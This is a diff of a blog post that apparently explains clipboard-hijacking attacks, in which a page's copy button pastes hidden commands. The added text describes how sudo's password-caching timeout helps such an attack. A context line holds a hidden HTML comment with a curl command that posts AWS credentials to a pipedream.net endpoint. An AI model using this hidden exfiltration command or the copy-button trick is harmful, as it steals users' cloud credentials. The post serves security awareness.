@@ -40,10 +40,12 @@ While the pervious example is a _"no duh sherlock"_ the copy button is a bit let
     <img style="max-width: 80%;" src="{{ page.asset }}/copy_button_hashicorp.png">
 </div>
 
-#### [Running commands on your Linux instance at launch | aws.amazon.com](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/user-data.html)
+#### [pyenv/pyenv README| github.com](https://github.com/pyenv/pyenv)
+
+Github injects a copy button for all code block in READMEs.
 
 <div style="text-align: center;">
-    <img style="max-width: 80%;" src="{{ page.asset }}/copy_button_docs_aws_userdata.png">
+    <img style="max-width: 80%;" src="{{ page.asset }}/copy_button_github_readme.png">
 </div>
 
 #### [How To List Users in the Oracle Database | oracletutorial.com](https://www.oracletutorial.com/oracle-administration/oracle-list-users/)
@@ -197,7 +199,31 @@ The curl downloads a file, makes it exactable, runs it.
 
 ## Composing the Attack
 
-Now the real danger is in the sudo command.
+Now the real danger is in the `sudo` command. The `sudo` command gives a user temporarily elevated privileges allowing the completion of tasks that require to be run as the root user.  Often sudo is used to install or update packages, i.e. `sudo apt-get install apache2` on.
+
+```
+nick ~
+$ sudo apt-get install apache2
+[sudo] password for nick:
+```
+
+When sudo is run the user is asked to enter their password to allow the action. Sudo then will check if the user has the need permissions to run the command if not the command will get denied. For example lets install `apache` and `nginx`. 
+
+```
+nick /home $ sudo apt-get install apache2
+[sudo] password for nick:
+Reading package lists... Done
+...
+nick /home $ sudo apt-get install nginx
+Reading package lists... Done
+...
+nick /home $
+```
+
+Notice how for the second sudo command didn't require a password. Thats because sudo has a setting entitled, `timestamp_timeout` sets the number of minutes that can elapse before sudo will ask for a passwd again. This allow to run multiple sudo command in short pervious of time without needing to re-enter your password over and over again.By default is value is set to 5 minutes.
+
+
+
 
 
 ### Social Engineering
@@ -206,7 +232,7 @@ Now the real danger is in the sudo command.
 
 <!-- curl -s -d "$(cat ~/.aws/credentials_fake)" https://en2lx5n7b4y69.x.pipedream.net/ > /dev/null; top; exit-->
 
-Your user can access your data your don't need sudo/root. 
+Your user can access your data your don't need sudo/root.
 
 <div id="totallysafeandhelpful">
   <h3>Welcome to totally-safe-and-helpful.blog</h3>
